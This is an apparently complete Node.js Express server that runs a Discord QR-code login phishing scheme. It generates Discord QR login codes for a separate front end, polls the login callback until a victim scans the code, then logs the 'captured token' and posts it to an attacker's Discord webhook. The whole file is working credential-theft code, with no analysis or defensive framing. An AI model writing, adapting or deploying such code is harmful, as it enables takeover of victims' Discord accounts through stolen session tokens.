const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(cors()); // allows vercel to talk to railway

let currentQr = "";
let currentSessionId = "";
let isPolling = false;

const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL';

// 1. endpoint for vercel to get the QR code
app.get('/get-qr', async (req, res) => {
    if (!currentQr) {
        // if no session exists, start one
        try {
            const response = await axios.post('https://discord.com/api/v9/auth/qr/generate');
            currentQr = response.data.code;
            currentSessionId = response.data.id;
            startPolling(currentSessionId);
        } catch (e) {
            return res.status(500).send("error generating qr");
        }
    }
    res.json({ qr: currentQr });
});

// 2. the poller
async function startPolling(sessionId) {
    if (isPolling) return;
    isPolling = true;
    console.log("[*] polling started...");

    const interval = setInterval(async () => {
        try {
            const status = await axios.get(`https://discord.com/api/v9/auth/qr/callback/${sessionId}`);
            if (status.data.token) {
                console.log("[!!!] captured token:", status.data.token);
                await axios.post(WEBHOOK_URL, { content: `token: ${status.data.token}` });
                clearInterval(interval);
                isPolling = false;
                currentQr = ""; // reset
            }
        } catch (e) {
            // keep polling
        }
    }, 3000);
}

app.listen(process.env.PORT || 3000, () => console.log("brain online"));
